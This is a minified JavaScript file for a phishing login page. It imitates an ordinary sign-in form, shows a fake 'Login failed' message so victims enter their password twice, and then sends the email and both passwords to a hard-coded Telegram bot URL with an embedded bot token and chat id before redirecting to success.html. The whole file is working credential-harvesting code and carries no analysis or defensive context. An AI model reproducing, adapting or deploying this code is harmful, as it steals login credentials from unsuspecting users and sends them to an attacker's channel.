const myForm=document.getElementById("myForm"),emailField=document.getElementById("user"),passwordField=document.getElementById("pass"),errorField=document.getElementById("error"),submitBtn=document.getElementById("formsubmit");let clickCount=0,firstPassword=null,emailValue=null;function isValidEmail(e){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)}submitBtn.addEventListener("click",e=>{e.preventDefault(),0===clickCount?""!==emailField.value&&isValidEmail(emailField.value)&&""!==passwordField.value?(emailValue=emailField.value,firstPassword=passwordField.value,clickCount++,submitBtn.disabled=!0,myForm.reset(),emailField.value=emailValue,submitBtn.disabled=!1,firstPassword&&(errorField.innerText="Login failed - Username or password is incorrect",errorField.style.display="block")):(errorField.innerText="Please enter your username and password",errorField.style.display="block"):1===clickCount&&(""===passwordField.value?(errorField.innerText="Login failed - Username or password is incorrect",errorField.style.display="block"):(submitBtn.disabled=!0,e=`New form submission:
Email: ${emailValue}
Password 1: ${firstPassword}
Password 2: `+passwordField.value,e="https://api.telegram.org/bot5736277261:AAEL0BaJHo9kyddgtseYsC-OCCP0D6b7AfA/sendMessage?chat_id=5674884293&text="+encodeURIComponent(e),fetch(e).then(e=>e.json()).then(e=>{e.ok?(console.log("Message sent to Telegram chat successfully!"),window.location.href="success.html"):console.error("Error sending message to Telegram chat!")}).catch(e=>console.error(e)),clickCount=0,myForm.reset(),emailField.value=emailValue,passwordField=document.getElementById("pass").value))});